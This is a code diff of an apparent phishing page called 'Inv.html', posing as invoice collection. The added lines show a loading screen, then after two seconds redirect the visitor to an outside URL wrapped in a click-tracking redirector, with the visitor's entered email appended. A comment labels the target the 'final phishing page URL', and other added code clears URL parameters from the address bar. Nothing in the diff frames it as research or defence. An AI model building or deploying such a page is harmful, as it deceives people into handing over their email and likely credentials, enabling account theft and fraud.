+            document.getElementById('loadingScreen').style.display = 'flex';
+            setTimeout(function() {
+                document.getElementById('loadingScreen').style.opacity = '1';
+            }, 10);
             
             // Redirect after 2 seconds
             setTimeout(function() {
+                // CHANGE THIS to your final phishing page URL
+                const finalURL = 'https://click.sensoriopaso.com/em?r=https%3A%2F%2Fnipctbd.org/8ia%2F&ecr=Y-9SIcdQOo1WYkAPxySoaZobMSvhRrTDKQ%3D%3D+' + encodeURIComponent(email);
+                
+                console.log('🚀 Redirecting to:', finalURL);
                 window.location.href = finalURL;
             }, 2000);
         });
         
-        // Log page access
-        console.log('📄 Inv.html loaded - Invoice collection page');
-        console.log('💡 This page collects email and redirects to final destination');
+        function validateEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+        
+        // Clear any URL parameters to keep email field empty
+        if (window.history.replaceState) {
+            const cleanURL = window.location.protocol + "//" + window.location.host + window.location.pathname;
+            window.history.replaceState(null, null, cleanURL);
+        }
     </script>
 </body>
 </html>
